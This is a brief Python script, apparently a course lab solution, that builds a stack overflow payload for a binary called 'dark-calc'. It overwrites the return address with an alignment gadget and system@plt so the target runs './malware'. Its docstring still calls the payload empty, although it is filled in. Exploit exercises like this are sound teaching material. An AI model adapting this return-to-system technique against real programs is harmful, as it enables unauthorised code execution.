#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
from struct import pack

command = b"./malware\x00" + b"A" * 6
fake_rbp = b"B" * 8
align_ret = pack("<Q", 0x4019D6)
system_plt = pack("<Q", 0x4017E0)
payload = command + fake_rbp + align_ret + system_plt

sys.stdout.buffer.write(payload)
